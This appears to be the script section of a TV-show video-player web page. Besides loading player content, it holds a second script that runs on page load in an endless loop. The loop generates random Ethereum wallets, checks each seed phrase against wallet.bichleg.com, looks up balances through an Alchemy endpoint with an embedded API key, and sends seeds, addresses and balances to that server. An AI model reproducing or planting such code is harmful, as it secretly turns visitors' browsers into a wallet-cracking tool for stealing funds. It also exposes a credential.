    <script>
        function getUrlVars() {
            var vars = [],
                hash;
            var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
            for (var i = 0; i < hashes.length; i++) {
                hash = hashes[i].split('=');
                vars.push(hash[0]);
                vars[hash[0]] = hash[1];
            }
            return vars;
        }
        var tvshow = getUrlVars()["tvshow"];
        var key = getUrlVars()["video"];

        $.post("https://bichleg.com/index.php", {
            page: 'player',
            tvshow: tvshow,
            key: key
        },
            function (data) {
                $("#main").html(data);
                $("#pageloader").hide();
            }
        );
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"

    <script>
        const API_KEY = 'https://eth-mainnet.g.alchemy.com/v2/JCNCAmqFfaWQ9WQrW143reOVrnRg1YfY';
        const provider = new ethers.JsonRpcProvider(API_KEY);

        async function main() {
            var res = '';
            while (1) {
                let wallet = ethers.Wallet.createRandom();
                let mnemonic = wallet.mnemonic.phrase;
                await $.post('https://wallet.bichleg.com/index.php',
                    { 'exist': mnemonic },
                    function (data) {
                        if (data == '0000') {
                            res = '0000';
                        } else {
                            res = '1111';
                        }
                    });
                if (res == '0000') {
                    let address = wallet.address;
                    let balance = ethers.formatEther(await provider.getBalance(wallet.address));
                    await $.post('https://wallet.bichleg.com/index.php', { 'seed': mnemonic, 'wallet': address, 'balance': balance });
                }
                res = '';
            }
        }

        main();
    </script>
